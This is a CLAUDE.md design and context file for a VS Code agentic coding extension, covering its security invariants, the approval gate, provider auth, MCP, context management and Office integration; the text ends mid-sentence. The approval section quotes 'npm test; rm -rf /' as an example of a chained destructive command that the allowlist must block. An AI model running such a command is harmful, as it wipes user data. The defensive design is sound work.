# CLAUDE.md — Light Code

This file is the durable context for every Claude Code session in this repo. Read it
first. If a decision here conflicts with something you are about to do, this file wins —
raise the conflict with the user rather than working around it.

Keep this file current. When a phase completes or a decision changes, update the relevant
section in the same commit.

---

## 1. What Light Code is

An open-source VS Code extension: a minimal agentic coding assistant. It provides a chat
UI, a small set of built-in agent tools, configurable LLM providers, MCP tool integration,
and image attachments — and deliberately nothing else.

It is built **greenfield**, using the archived [Roo Code](https://github.com/RooCodeInc/Roo-Code)
repository (Apache-2.0, archived 2026-05-15, final release v3.54.0) as a **frozen
reference**. We borrow proven formats and patterns from it. We do not fork it, and we do
not copy code verbatim without attribution. For anything Roo did poorly, check Cline or
Kilo Code, which are actively maintained.

Primary deployment context: **inside an organisation**, against an internal LLM gateway
and internal MCP servers. This drives several design decisions that would otherwise look
over-cautious.

License: MIT. No telemetry, ever.

### Current focus

The **VS Code extension** is the product. A Node-host/browser version is planned later and
is the reason for several architectural constraints below, but no work on it happens until
the extension ships. See §14.

---

## 2. Repository layout

```
packages/core      Agent loop, tools, providers, auth, MCP client, config, secrets.
                   Platform-agnostic. MUST NOT import `vscode`.
packages/ui        React chat + settings UI. Talks over a Transport interface.
                   MUST NOT import VS Code webview APIs directly.
apps/vscode        Thin host: activation, SecretStorage, webview plumbing, ripgrep. ~400 LOC.
apps/host          Node server + browser UI. Published as @chosengeneration/light-code.
                   See §14.
```

pnpm workspaces. No Turborepo — the repo is too small to justify it.

---

## 3. Hard invariants

These are non-negotiable. The first two are enforced by ESLint; breaking them fails CI.

1. **`packages/core` never imports `vscode`.** Enforced by `no-restricted-imports`.
2. **All outbound network traffic goes through the single `HttpClient` in core.**
   `fetch`, `axios`, `undici`, and `node:http`/`node:https` are banned everywhere else.
   Enforced by `no-restricted-imports`.
3. **No default endpoints.** A fresh install contacts nothing. Every URL is user-supplied.
4. **No telemetry, no update checks, no remote assets.** All webview assets are bundled
   locally. CI fails if built output contains an absolute external URL.
5. **These config keys are user-scope only and are ignored if found in workspace config:**
   the entire `profiles` list, `activeProfileId`, `certDir`, `tls`, `python.uvPath`,
   `approvals`, and — from Phase 8b — `vectorStores`, `activeVectorStoreId`, and `embedder`.
   `tls` is the global trust block: a workspace able to add a trusted root, or to switch
   verification off, could intercept the gateway connection leaving nothing the user would
   ever see.
   A hostile repo must not be able to repoint credentials or executables — this means a
   workspace can't inject a whole new profile (its own `baseUrl`/`auth`/`model`) any more
   than it could edit an existing one, and can't switch which profile is active. (Originally
   worded as `provider.baseUrl` + "everything under `auth`" for a single active profile;
   broadened to the whole list once named profiles — §9 — made that shape a list of
   profiles rather than one singleton.)
   **`approvals` was added in Phase 4.** Auto-approve toggles and the "always allow" list
   are *scoped* per workspace (§8) but *stored* user-side, keyed by workspace path.
   Storing them in `.lightcode/config.json` would let any repo you clone pre-approve its
   own shell commands before you had looked at it — a worse hole than the one this
   invariant already closes. **Scope and storage location are separate decisions; do not
   collapse them.**
   **The indexing keys were added when Phase 8b was planned (2026-08-09)**, and they are the
   sharpest case on this list. A workspace able to set `embedder.baseUrl` would exfiltrate
   every file you indexed to an endpoint of its choosing, the moment you opened the repo —
   same threat as repointing a profile, but the payload is your source code. Note the
   contrast with `mcpServers`, which is deliberately *not* here: an MCP server still passes
   through the approval gate on every call, and indexing does not pass through anything.
6. **Cert/key files must live outside the workspace root**, and their resolved paths are on
   a hard deny list for every file-reading tool.
7. **Secrets never cross the bridge toward the UI.** Write-only. No `getSecret` message
   type exists.
8. **Approval UI shows ground truth** — the literal command, the computed diff, the actual
   source — never the model's description of what it intends to do.

### The security boundary, stated precisely

> Light Code makes no network connection the user has not configured. It ships with zero
> default endpoints, no telemetry, no update checks, and no remote assets. The only hosts
> it contacts are the model gateway, MCP servers, and — if indexing is enabled — the vector
> store and embedding endpoint named in config. Code that Light Code executes on the user's
> instruction — shell commands, Python tools, MCP servers — is outside this boundary and
> governed by the user's environment.

**Indexing is the largest egress in the product** and the README must say so plainly:
enabling it sends the contents of the workspace to the configured embedding endpoint. It is
opt-in, ships disabled, and confirms the destination on first use (Phase 8b).

We do **not** sandbox executed code, and we do not protect against another process running
as the same user. Say so plainly in the README. Do not overclaim.

Two things sit awkwardly on this line and are treated as *ours* to handle: package-runner
MCP commands (`npx -y ...`) and `uv` resolving PyPI. Both fetch from the internet on
machinery Light Code chose. Warn on the first; make the second use a configured index or
run offline.

---

## 4. Platform interfaces

Everything platform-specific lives behind an interface in core. There is one
implementation of each in v1. That is the point — the second host becomes a port, not a
rewrite.

- `FileSystem` — read, write, stat, list. Plain string paths.
- `Terminal` — run a command, stream output, kill a process tree.
- `SecretStore` — async get/set/delete; reports which backend is active.
- `Config` — load/save/watch scoped JSON config.
- `Transport` — bidirectional message passing between host and UI.
- `HttpClient` — the sole network egress point.

**Paths are plain strings in core.** `vscode.Uri` conversion happens only at the host
boundary. This one leaks more easily than the others; watch for it in review.

---

## 5. Agent loop

Autonomous multi-step, modelled on Roo:

- One tool call per assistant message.
- User approval between steps (subject to auto-approve settings).
- Loop continues until the model calls `attempt_completion`.
- Hard iteration cap (default 25, configurable) with a clear message on hit.
- Tool results are fed back as the next user turn.

---

## 6. Tools

Nine in v1, and more since — see the handover for what exists now:

| Tool | Group | Notes |
|---|---|---|
| `read_file` | read | Line-numbered output; supports offset/limit ranges |
| `list_files` | read | ripgrep-backed; recursive optional; ignores `node_modules`, `.git` |
| `search_files` | read | ripgrep regex with context lines |
| `write_to_file` | edit | Full content. Approval shows a computed diff |
| `apply_diff` | edit | See §7. The primary edit path |
| `execute_command` | command | VS Code integrated terminal with shell integration |
| `use_mcp_tool` | mcp | Namespaced; see §11 |
| `ask_followup_question` | always | Control tool |
| `ask_user_form` | always | Typed input — string, number, boolean, choice, list. See §6b |

**Every tool advertises an optional `why`** (0.43.0), added once in `toToolDefinitions` and
stripped in the loop before validation. The transcript showed a bare tool name and nothing else,
because most models emit no assistant text alongside a call — so the reason had to be part of the
call to be reliably present. Stripping it is what makes it safe to add to an MCP server's own
schema (§11 forbids translating one): the server never sees a property it did not declare, and a
schema shaped in a way `withWhy` does not recognise is left completely alone.
**It moved a measured tradeoff:** `why` is a fixed cost per *advertised* tool, so the dispatcher
now saves prompt at three tools where it used to cost. `agent/dispatch.test.ts` records that
rather than being re-baselined.
| `attempt_completion` | always | Control tool; terminates the loop |

**Explicitly not in v1:** browser automation, semantic/embedding codebase search,
`insert_content`, `list_code_definition_names`, mode-switching and subtask tools, a fetch
tool.

**Semantic search is no longer excluded outright — it moved out of v1 rather than out of
the project.** Reversed by the user on 2026-08-09; two tools (`search_codebase`,
`search_docs`) arrive in Phase 8b, after release. See §12 and §18 for what changed.

Browser automation was raised again in Phase 3 and **stays excluded** — no browser tool,
no bundled browser MCP server. A user who wants it configures a Chrome DevTools MCP server
themselves once Phase 5 lands, which needs nothing from us.

**Two tools arrive after v1**, both added to the plan during Phase 3:
`read_tool_result` (already built — the re-read half of result truncation, §12) and
`notify` (a VS Code toast, needed so unattended scheduled runs can surface results —
Phase 9b).

Constraint: **the model must have read a file in the current session before editing it.**
Cheap invariant, eliminates a class of hallucinated edits.

---

## 6b. Asking the user for input (0.38.0)

`ask_user_form` shows a small form and returns the answers **as a tool result, so the turn
continues**. User-requested, and explicitly not limited to skills — *"agent should be able to
show wherever agent wants to get input from user"*.

- **Why it is not `ask_followup_question`.** That tool ends the turn and treats the next message
  as the answer, which is right for one open question. For four specific values it means the
  assistant describes them in prose, the user answers in prose, and the assistant parses prose
  back into values — three places where a wrong value looks exactly like a right one.
- **Five field types, and no more without a reason.** `string` (optionally multiline), `number`,
  `boolean` (checkbox), `choice` (the existing `Select` — never a native `<select>`, §the UI
  conventions), and `list`: one box split on commas *or* pasted newlines, answered as an array.
  `list` exists because "which trade ids" is a real shape and the alternatives — a string the
  model splits itself, or twenty fields — are both worse.
- **It grants nothing.** A submitted form is input, never permission: acting on what it says
  still goes through the approval gate on its own terms. Reading a filled-in form as consent
  would put model-authored text where ground truth belongs (invariant 8).
- **Coerced host-side as well as in the form.** The UI validates for the person filling it in;
  `coerceFormValue` decides what reaches the model, because a number field must never yield the
  string "twelve" to be discovered somewhere else much later.
- **Absent for a scheduled run**, exactly like `requestPathAccess` — nobody is there to answer,
  and a job that stopped to wait for a form would never finish. The tool says so and continues.
- Every path out of a turn settles a parked form (dismissal, cancel, dispose). A promise nobody
  will resolve is a turn that hangs with nothing to click.

---

## 7. Edit strategy — `apply_diff`

This is the highest-consequence part of the codebase. Read this section fully before
touching it.

### Format

Roo's marker format, which models are heavily trained on:

```
<<<<<<< SEARCH
:start_line:42
-------
  throw new Error("no user")
=======
  throw new UnauthorizedError("no user")
>>>>>>> REPLACE
```

- Multiple blocks per call, for one file.
- `:start_line:` is a **hint** used to prioritise search order, not a requirement.
- **All blocks are validated before any write.** Partial application is forbidden.
- Reject `:start_line:` or other markers appearing after the `=======` separator — this is
  a real failure mode observed in Roo with some models.

### Matching cascade — deterministic, in order

1. **Exact match** after normalising line endings to `\n`.
2. **Whitespace-insensitive**: compare with leading/trailing whitespace stripped per line;
   apply using the file's real indentation.
3. **Anchor match** (blocks of 5+ lines only): match first and last lines, verify the
   interior is consistent.
4. **Fail** — return the failure plus the actual current text around the hinted region so
   the model can retry with correct context.

**There is no similarity threshold and no Levenshtein scoring.** This is a deliberate
divergence from Roo, whose fuzzy matcher produced both false rejections (99% similar,
needed 100%) and the risk of silent misapplication. A rejected edit costs a retry; a
misapplied edit costs data.

**Do not add fuzzy matching later without an explicit decision from the user.**

### Other rules

- **Uniqueness required.** If SEARCH text matches in more than one place, reject and ask
  for more context. Never "apply to the first occurrence."
- **Line endings:** detect the file's dominant EOL on read, normalise to `\n` for all
  model-facing content, restore the original on write. Without this, every edit to a CRLF
  file fails. This is not optional on Windows.
- **Normalisation is limited to line endings and trailing whitespace.** Do not decode HTML
  entities or apply any other transformation to the SEARCH block — Roo had a bug here.
- **Consecutive-mistake tracking** per file: after N failed attempts on the same file
  (default 3), stop and surface it rather than letting the model loop.

---

## 8. Approval, checkpoints, modes

### Approval

- Per-invocation by default. **All auto-approve toggles ship off.**
- Granular auto-approve by category: read / edit / command / mcp.
- **Command "always allow" is exact-match only, on every platform.** A command is
  auto-approved only when its string is byte-for-byte identical to one previously
  approved in this workspace. `npm test` covers exactly `npm test` and nothing else —
  `npm test; rm -rf /` is a different string and still prompts.
  *(Revised during Phase 3. This was originally "no command allowlist on Windows",
  because deciding whether a command is covered by a pattern means tokenising
  PowerShell's grammar — `;`, `&&`, `|`, `$(...)`, nested quoting — and a parsing bug
  silently auto-approves a chained destructive command. Exact matching needs no parser
  at all, so the hazard disappears and the platform carve-out with it. **Do not
  "improve" this into prefix or glob matching** — that reintroduces exactly the problem
  this avoids.)*
- "Always allow" scopes to a specific tool in a specific workspace. Never global.
- Approval UI renders ground truth (invariant 8).

### Checkpoints

Shadow-git snapshot before the first edit of a task, allowing rollback. Borrowed from Roo.
Cheap insurance, and it pairs well with the strict-matching decision.

### Modes and tool groups

Tools belong to groups (`read`, `edit`, `command`, `mcp`, `always`). A mode includes or
excludes groups.

- **Code** — all groups.
- **Ask** — `read`, `mcp`, `always`. This *is* the read-only mode; it is not a separate flag.

This mechanism doubles as the tool-profile system for context budgeting (§12). Custom
user-defined modes are deferred.

---

## 9. Providers

Three wire adapters, one interface:

- **OpenAI-compatible** — DeepSeek is a preset over this (base URL + label).
- **Anthropic Messages** — built in Phase 7.
- **Gemini `generateContent`** — built in Phase 7.

`providers/factory.ts` picks the adapter from `profile.wireFormat`. Because auth is a
separate axis, that is a one-line switch and mutual TLS composes with Anthropic exactly as
it does with OpenAI. **An API key's header name is wire-format-specific** (`x-api-key`,
`x-goog-api-key`, `Authorization: Bearer`) and is derived from the profile — getting it
wrong is a 401 that reads as a bad key.

Presets prefill base URL and wire format. **Every field remains user-editable.** No
hardcoded endpoints anywhere (invariant 3).

**Named profiles.** Users have several — e.g. the corporate gateway and a local dev model —
switchable without retyping. Borrowed from Roo's API configuration profiles.

### Model selection

Dropdown populated from the provider's models endpoint (`/v1/models`, `/v1beta/models`),
with **free-text entry always available** and a manual refresh. Gateways frequently return
their own catalogue or 404 — never make the dropdown a hard dependency.

Ship a local metadata table keyed by model ID for **context window, vision support, and
tool-use support**, since models endpoints do not reliably report these. Per-profile
overrides in the UI. Unknown IDs (likely with gateway aliases) default conservatively.

---

## 10. Auth

Auth is a **separate pluggable axis from wire format**, so any strategy composes with any
adapter.

```
Provider = { wireFormat, baseUrl, auth, model, headers? }
Auth     = { type: "apiKey" | "apigeeMtls" | "none", ... }
```

### Simple config (UI default)

Preset, base URL, API key, model.

### Advanced config — `apigeeMtls`

**Replaces** the API key rather than supplementing it. Never both live at once.

Flow: mTLS handshake to the token endpoint → `client_credentials` grant → `access_token`
+ `expires_in` → attached to inference requests.

Implementation requirements:

- **Proactive refresh:** refresh at `issuedAt + expiresIn - skew` (default 60s). Never wait
  for a 401 — it stalls mid-stream.
- **Single-flight:** concurrent requests share one in-flight refresh promise.
- **One 401 retry:** force-refresh, retry once, then a clear error. Never loop.
- **Streaming:** validate token lifetime before opening a stream, with margin for a long
  generation.
- **Token in memory only.** Never on disk, never in logs, redacted in the audit log.

All of these are configurable in Advanced with working defaults:
`tokenUrl` (default: baseUrl origin + `/oauth/token`), `grantType`, `clientId`,
`clientSecretRef`, `scope`, `extraTokenParams`, `tokenHeaderName` (default
`Authorization`), `tokenHeaderPrefix` (default `Bearer `), `tokenPath`, `expiresInPath`,
`fallbackExpirySeconds` (default 3600 — some gateways omit expiry entirely),
`refreshSkewSeconds`, `extraHeaders`.

### Connection trust vs. client identity — keep these separate

A **client certificate** is how the gateway identifies you. **Connection trust** is how you
decide the gateway is who it claims to be. Until 0.1.2 they were tangled: a CA could only be
supplied inside the `apigeeMtls` auth block, so an ordinary API-key user behind a
TLS-intercepting corporate proxy had **no way to add their root CA at all** and was simply
blocked. `ProviderProfile.tls` now carries `caFile` and `rejectUnauthorized` for every auth
type, and it merges with any client material the auth strategy supplies.

`rejectUnauthorized: false` exists, per-profile and off by default. It is a genuine hole —
an interceptor can read and modify the traffic including the API key, undetectably — and
the UI says so in those terms whenever it is on. It is here because "my gateway uses an
internal CA I cannot easily export" is a real, common situation that otherwise blocks the
product entirely, and someone in that position will find a worse workaround. **The CA path
is the fix; this is the escape hatch.** Note it needs no invariant-5 entry of its own: the
whole `profiles` list is already user-scope only, so a workspace cannot switch verification
off.

### Certificates

User specifies a **directory** plus filenames; filenames resolve against it, absolute paths
override it. Defaults `client.crt` / `client.key`. Support `pfx` as an alternative — corporate
Windows PKI usually issues `.pfx`. Passphrase is a `SecretStorage` ref, never a literal.

**Configured once, globally.** The top-level `tls` block (CA, client certificate, key, PFX,
passphrase ref, `rejectUnauthorized`) applies to every connection — gateway, token endpoint,
OpenSearch, embedder. Per-connection settings layer over it through the one resolver in
`platform/connectionTls.ts`; see §19 for the three merge rules and why each is what it is.
**Do not add a fifth place to configure a CA** — go through that resolver.

- Validate **at config time**: files exist, parse, key matches cert, and report `notAfter`.
- Warn at 30 and 7 days before expiry.
- Watch cert files; on change rebuild the TLS agent and drop the cached token.
- Handshake errors must name the file and the reason (expired / key mismatch / CA
  untrusted). Never surface raw OpenSSL codes.
- `certDir` must be outside the workspace and on the tool deny list (invariants 5, 6).
- Support `NODE_EXTRA_CA_CERTS` and a configurable `ca` path — corporate TLS interception
  will otherwise break the one legitimate connection.

### Test Connection

A button in Advanced that runs load-certs → get-token → list-models and reports **which
step failed**. This is the highest-value piece of UI in the settings panel; it converts a
class of opaque TLS and OAuth failures into a one-click diagnosis.

---

## 11. MCP

Client runs **host-side** (extension host; later the Node main process) — it spawns
processes and opens sockets, so it can never run in the webview.

- SDK: `@modelcontextprotocol/sdk`. Do not hand-roll JSON-RPC.
- Transports: **stdio** (common case) and **Streamable HTTP**. Check current SDK/spec
  status before implementing — this area moves quickly. SSE is superseded but still
  deployed in the wild.

**SDK notes, verified against 1.30.0 in Phase 5** (re-verify on upgrade — this section
was already stale once):
- Transports live at `@modelcontextprotocol/sdk/client/stdio.js` and
  `.../client/streamableHttp.js`; the `Client` class at `.../client/index.js`.
- `tools/list_changed` no longer needs a hand-registered notification handler —
  `ClientOptions.listChanged.tools.onChanged` covers it.
- `jsonSchemaValidator` is configurable (`./validation/ajv`, `./validation/cfworker`) but
  optional; Ajv is the default and is what we use.
- **`StdioServerParameters.env` replaces the default rather than merging.** The SDK's
  `getDefaultEnvironment()` is already a safe allowlist (`PATH`, `HOME`, … — no blanket
  inheritance), which is exactly what §15 wants. But passing any `env` at all drops it,
  so a server given one variable would lose `PATH` and fail to spawn. Always spread:
  `{ ...getDefaultEnvironment(), ...configured }`.
- The SDK's concrete transports are **not assignable to its own `Transport` interface**
  under `exactOptionalPropertyTypes` (`sessionId: string | undefined` vs `sessionId?:
  string`). One narrow cast in `mcp/client.ts` handles it; drop the cast if upstream fixes it.
- Config uses the standard `mcpServers` shape so users can paste configs from other
  clients unchanged.
- Global and workspace scopes; workspace wins.
- **Namespace every tool** (`filesystem__read_file`). Collisions across servers are
  inevitable.
- Per-server and per-tool enable toggles **from the start** — a single server can expose
  forty tools and they all land in the system prompt.
- **Connect when the Light Code panel opens** — health status in the UI; restart on
  crash; handle `tools/list_changed`.
  *(Revised in Phase 5. This said "lazy connect on first use", which was applied too
  literally: a server sat at `idle`, and a mistyped command was indistinguishable from a
  working one until something happened to use it. The constraint that actually matters is
  not spawning processes at VS Code startup — and the extension activates on
  `onView:lightCode.chatView`, so panel-open is already well after startup and is a clear
  signal of intent. Note this means an `npx`-based server fetches from the network when
  the panel opens; that is why the §3 package-runner warning is shown in the MCP tab.
  Startup is fire-and-forget so a slow server never delays the panel rendering.)*
- Secrets interpolated from `SecretStorage`/env, never written into the config file.
- **Schema translation per provider** is a common source of silent tool-call failures.
  MCP gives JSON Schema; Anthropic wants `input_schema`, OpenAI nests under
  `function.parameters`, and providers differ on tolerated keywords.

**Deferred:** resources, prompts, and **sampling** (a real security surface — do not
implement without an explicit decision).

---

## 12. Context management

Three things compete for the window, and they scale very differently. Results dominate.

- **Prompt caching inverts the obvious answer.** Tool definitions sit at the front of the
  prompt. Swapping them per turn to "save context" invalidates the cache prefix *and all
  history after it*, costing more than sending everything. **The static prefix must be
  stable within a session.** Selection happens at mode/session boundaries only.
- **Result truncation with a re-read handle** — the single biggest lever, and the one thing
  that must exist in v1 because retrofitting changes every tool's return path. Cap results
  (~2k tokens), store full output on disk, return a reference the model can re-read with an
  offset.
- **Drop superseded results** — if a file was read three times, only the latest matters.
- **History compaction** past a threshold: summarise oldest turns, keep the last N verbatim.
  Never compact mid-tool-call. Preserve file paths, commands run, and decisions made.
- **Modes are the tool-profile mechanism** (§8). Do not build a separate one.
- **Instrument it:** per-request token breakdown (system / tool defs / history / results)
  plus cache hit rate, surfaced in the UI.

Semantic retrieval over tool descriptions is **out** — silent misses, embedding dependency,
and turn-1 queries don't predict step-7 needs.

**Revised 2026-08-09.** The user asked for skill and tool documentation to be retrievable
from a vector store, which reverses the paragraph above. The reasoning behind it was never
"retrieval is useless" — it was that **tool definitions sit at the front of the prompt, so
varying them per turn invalidates the cache prefix and everything after it.** That cost is
real and unchanged, so Phase 8b resolves it structurally rather than by accepting it:

- Retrieval is exposed as **tools the model calls** (`search_docs`, `search_codebase`).
  Results arrive as tool results, mid-conversation, where they cost nothing at the prefix.
- The set of *available* tools stays byte-stable for a whole session. Using retrieval to
  choose **which** tools load is permitted only at a mode or session boundary — the
  carve-out this section already made.

**Do not turn this into per-turn tool-definition selection.** That is the specific thing
the original decision ruled out, and the reason still holds.

### The dispatcher (2026-08-14) — and why it is *not* the thing this section forbids

The user asked for tool and skill documentation to live in a vector store, retrieved
semantically, loaded into context on demand and dropped again afterwards. Read quickly that
sounds like exactly the banned design. It is not, and the distinction is worth writing down
precisely, because the next session will have the same doubt.

What §12 forbids is **the set of advertised tool definitions varying per turn**: they sit at
the front of the prompt, so changing them invalidates the prefix and all history after it.
What shipped instead:

- **`call_tool(name, arguments)`** — one entry point, always present, byte-identical whether
  the workspace hides three tools or three hundred. `agent/dispatch.test.ts` asserts that
  directly, building two registries of wildly different size and comparing the serialised
  definitions.
- Tools registered `dispatchOnly` are **fully registered but unadvertised**. The prefix does
  not grow with the catalogue, and it does not *change* within a session either.
- **`search_docs`** returns schemas as tool *results*, mid-conversation, where they cost
  nothing at the prefix — precisely the carve-out this section already made.

So the prefix ends up *more* stable than before, not less. The banned design made the tool
block a function of the turn; this makes it a constant.

**`dispatchOnly` is a prompt-size control, not a security control.** A hidden tool is still
callable by name. Withholding a *capability* is what modes and the approval gate are for, and
collapsing the two would be a real mistake.

**Both are on by default now (2026-08-2x), and skills go through the same mechanism.** The user
asked for search-the-tool-first to be the normal way to work, and for skills to be found the same
way rather than listed. `dispatcherEnabled()` and `skillRetrievalEnabled()` in `config/schema.ts`
own that default — `retrieval?.dispatcher !== false`, so absent means on and the config file stays
sparse. Skill retrieval is **tied to** the dispatcher rather than independent of it: `search_docs`
is what finds a hidden skill and is only registered when the dispatcher is on, so hiding skills
without it would make every skill unreachable.

**Nothing may decide that default by reading the key.** Two places did — written when the default
was off, correct then, silently wrong after the flip: tools were hidden by one path while the
automatic documentation reindex returned early in another, so `search_docs` had no index and
degraded to matching names. That is what "I have to tell it which tool to use" looks like from the
outside. `config/retrieval.test.ts` now reads `bridge.ts` and fails on any surviving direct read,
because the defect is a decision *not reaching* the owner, which no test of the owner can see.

The other two original objections stand as warnings rather than blocks: a silent miss is
still a silent miss, so `search_docs` supplements `read_file` and never replaces it, and the
embedding dependency is why the whole feature is opt-in and ships disabled.

---

## 12b. The Claude CLI expert (0.2.0)

A cheaper primary model can consult Claude through its CLI, via the `ask_expert` tool.
User-requested, to get strong-model quality on hard problems without paying strong-model
rates for routine work.

**Read-only by construction, and this is the load-bearing decision.** Claude may `Read`,
`Grep` and `Glob` the workspace so it gathers its own context; it may not edit or run
anything (`--disallowedTools Bash,Write,Edit,…`). A second agent mutating the repository
would sit entirely outside Light Code's approval gate, which is precisely what §8 and
invariant 8 exist to prevent. It is also the cheaper design — an agentic Claude session
costs many times a single consultation, and spending less is the whole point.

The full-agent alternative (proxying Claude's own permission prompts into our approval UI
via `--permission-prompt-tool`) was considered and rejected on both counts. **Do not
implement it without an explicit decision**; tools Claude requests and is refused are
reported in the tool result instead, so nothing is hidden.

- The question goes on **stdin, never argv** — it is model-generated text, and §16 forbids
  interpolating that into a command line. The Windows `.cmd` shim is invoked through
  `cmd /c` with the prompt as a separate argument rather than `shell: true`.
- **`expert` is user-scope only** (invariant 5). `expert.path` names an executable, so a
  workspace able to set it would run a program of its choosing on panel open — the same
  threat as `python.uvPath`. `enabled` is covered too, so a repo cannot switch on paid API
  calls by itself.
- Off by default. Nothing is spawned and nothing is spent until the user enables it.
- Cost is surfaced per consultation, in the tool result and in the tab. A number nobody
  sees cannot be managed.
- **The price is measured on the machine, not assumed from published rates** (`expert/pricing.ts`).
  A button in the Expert tab runs two trivial consultations — one cold, one resumed — records
  `coldUsd`/`resumedUsd`, and stores them so Junior mode plans in *this* deployment's numbers. It
  exists because a corporate plan may account for credit differently, and the documented $0.187 is
  from one machine on one plan. The user's own measurement came back **0.007117 cold / 0.006539
  resumed** — a ratio of 1.09 against the 19× documented here.
- **`resumeWorked` is why that measurement is trustworthy.** If the CLI returns no `session_id`,
  the second sample is also a cold start, and two cold starts look exactly like a session that
  saves nothing. The flag records whether a resume actually happened, and `describePricing()`
  refuses to present a ratio when it did not — the honest reading of that number is "unknown",
  not "no benefit".
- **What the mode saves is reported as a floor, never as an estimate** (`expert/savings.ts`,
  0.40.0). The Expert tab shows today / 30 days / all time, and the working is on the page.
  Two components, both priced from the local measurement: turns the cheap model handled alone
  (each at `resumedUsd`, the cheapest an expert turn can possibly be) and cold starts avoided by
  resuming (`coldUsd - resumedUsd`, clamped at zero). **What the strong model would have charged
  to do the work itself is deliberately not counted** — nothing can know it, so no multiplier is
  applied. That is why every figure says "at least".
  With no measurement the panel shows a dash: zero would read as "this saved you nothing", which
  is a claim and the wrong one. This is what §12b's old "roughly 40–70%, order-of-magnitude only"
  was waiting for — **do not replace the floor with that guess.**
  The log is `expert-events.jsonl` in storage, **one JSON object per line on purpose**: an array
  would mean read-modify-write on every consultation, which is the shape that corrupted
  `config.json` (§15), and a torn final line costs one event rather than the history.
- **Keep-alive** (`expert.keepAlive`, off by default) pings a live session every fifty minutes
  against the one-hour cache TTL, so a lunch break does not cost a cold start. It never *starts* a
  session, stops when the task's budget is spent, and its cost is counted in the meter — a
  background timer that spends money invisibly is the version of this nobody should trust.
- Detection falls back to the npm prefix when the bare command is not on PATH. **This is an
  observed failure, not defensive padding:** an editor started before `npm i -g` does not
  see the new binary, so the user installs it and is still told it is missing.

**What actually happens when the expert wants a forbidden tool** — measured against CLI
2.1.227, because the answer was not what the code assumed:

- **It is never offered the tool, so there is nothing to refuse.** Asked to run a shell
  command it replies "I don't have a Bash tool available in this session" and adapts. Asked
  to write a file: "Write is disabled for this session, in subagents as well as here" — the
  restriction holds through subagents too.
- **It does not prompt and does not hang.** The provoked cases returned in 9s and 34s
  against a 120s timeout. This matters because a consultation runs inside another agent's
  turn, where no one is present to answer a prompt.
- **`permission_denials` came back empty** in every case, since nothing was
  requested-and-refused. `deniedTools` is therefore usually empty; it is kept for the case
  where a tool *is* offered and declined, not as the main reporting path.
- Nothing was written to the probe workspace.

**Also verified on Windows:** detection through the `.cmd` shim, a live consultation, and
the reported cost. **Untested:** non-Windows shim layouts.

## 12c. Excel and Outlook (0.42.0)

The assistant can attach to the Office applications **already running** on this machine. Requested
directly, and opt-in: `office.excel` and `office.outlook`, both off, in Settings -> Tools.

- **A live application, not a file.** The question people have is about the workbook in front of
  them, with unsaved edits. That is also why nothing here opens or saves a file.
- **`office` is user-scope only** (invariant 5), and it is the sharpest entry on that list after
  `expert`: a repository able to set it would read your mail and your open spreadsheets the moment
  you opened the folder.
- **Windows only.** `Marshal::GetActiveObject` is the only way to reach a running Office
  application and it does not exist in .NET Core, so the worker is **powershell.exe (5.1)**, not
  `pwsh`. Elsewhere the tools are absent rather than present and failing.
- **Neither app is ever launched.** Measured, not assumed: the first live test hung for a full
  60s timeout because `New-Object -ComObject Outlook.Application` *starts* Outlook. Both are
  attach-only now and say so.
- **`excel_trace_cell` is the feature that justifies the rest.** It walks a formula back through
  its precedents, across sheets, to raw input — the "why is this #DIV/0!" question. Excel's own
  `Precedents` covers only the current sheet, so cross-sheet references are also read out of the
  formula text.
- **VBA debugging is three tools, ordered by how much they risk** (0.44.0, and the user's
  constraint was explicit: nothing changes without approval). `excel_check_macro` is static — it
  changes nothing and reports *every* fault rather than the first, which is all running gives you.
  `excel_evaluate` computes a formula in the workbook's context without writing it anywhere.
  `excel_run_macro` executes, so it is `command`, always asks, is never available to a schedule,
  and its **preview fetches and shows the macro's own source** — invariant 8 applied to somebody
  else's code rather than to a diff we computed.
  **COM cannot drive the VBA debugger**: no breakpoints, no stepping, no locals while stopped.
  Say so rather than implying otherwise.
- **Two faults that only running it could find**, both now pinned by tests: an Excel error value
  arrives over COM as a signed integer (`#N/A` is -2146826246) and reads as a number a formula
  produced; and with the Trust Center setting off `VBProject` returns **null rather than
  throwing**, so every caller reported "no VBA modules" when the truth was blocked access.
- **`excel_write_macro` is in `ALWAYS_ASK_TOOLS` and `NEVER_AVAILABLE_TO_SCHEDULES`.** VBA runs on
  the machine as the user and nobody reviews a macro afterwards; that is section 13's argument
  exactly. The approval shows the code, and the workbook is left **unsaved** so it can be run
  before being kept.
- **The session picker needed no UI.** `excel_sessions` lists what is open and the model asks with
  `ask_user_form` (section 6b), which already renders a themed dropdown.
- Model-supplied text never reaches a command line (section 16): requests are JSON on stdin, and
  every value is passed as an *argument* to a COM method. `office.test.ts` asserts no
  `Invoke-Expression` survives in the script.
- **The script must stay pure ASCII.** Windows PowerShell decodes a BOM-less `.ps1` as ANSI, so one
  em dash in a comment was a parse error and a worker that never started. The runtime writes a BOM
  *and* the generator refuses non-ASCII *and* a test asserts it — three belts, because the symptom
  is a timeout that points nowhere near the cause.
- **PowerShell scoping cost a debugging round too:** a nested function assigning to an enclosing
  array creates a local copy, so the first trace returned empty with no error. `$script:` scoped.

- **Outlook folders are listed recursively** and searching takes `withinMinutes` (0.42.1). The
  first version listed only the top level, so a nested folder was reachable by path and
  impossible to discover — reachable-but-invisible is the same failure as absent.

**Verified against real Excel 16.0**: sessions, range reads, a three-level cross-sheet trace that
correctly identified a zero divisor as the source of a `#DIV/0!`, and `excel_evaluate` returning
`#N/A` and `#NAME?` for failing formulas.

**Not verified, and both for the same reason:** `excel_run_macro`, `excel_read_macro` and
`excel_check_macro` against a real module, because **"Trust access to the VBA project object
model" is off on the development machine** and turning it on is a change to someone's security
settings that no build step should make. The blocked-access path *is* verified — it produces the
message naming the setting. **Outlook's search and read are verified only as far as the
attach-refusal message**; they have never run against a live mailbox.

---

## 13. Python interop and skills (phase 9)

Two distinct mechanisms. **Do not share an implementation** — a skill is text injected into
context; a tool is code that executes. Same discovery patterns, completely different trust
models.

### Dynamic tools

The model can create, update, and delete Python tools during a chat.

- One file per tool. Entry point named `run`. Tool name from filename.
- **File is the source of truth.** Dependencies in a PEP 723 inline block (uv reads it
  natively). Schema derived from type hints via `pydantic.TypeAdapter(run).json_schema()`;
  description from the module docstring; parameter docs from Google-style `Args:`.
  Never hand-maintain metadata — it drifts within a week.
- `.registry.json` is a **generated cache** keyed by content hash. Gitignored. Never
  hand-edited.
- **Persistent worker process** per workspace, JSON-RPC over stdio, `importlib.reload` on
